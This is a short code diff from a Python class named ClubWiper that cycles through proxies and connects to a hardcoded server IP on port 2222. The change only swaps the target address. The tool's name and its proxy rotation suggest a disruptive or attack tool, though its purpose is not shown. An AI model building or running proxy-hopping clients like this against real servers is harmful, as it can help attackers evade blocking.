@@ -272,7 +272,7 @@ class ClubWiper():
 				print('Пробуем подключиться с', prxy[0], ':', prxy[1])
 				self.used_prx.append(prxy)
 				try:
-					sock.connect(('46.182.24.155', 2222))
+					sock.connect(('95.213.247.178', 2222))
 					break
 				except socks.GeneralProxyError:
 					print('Прокси не валидны..')
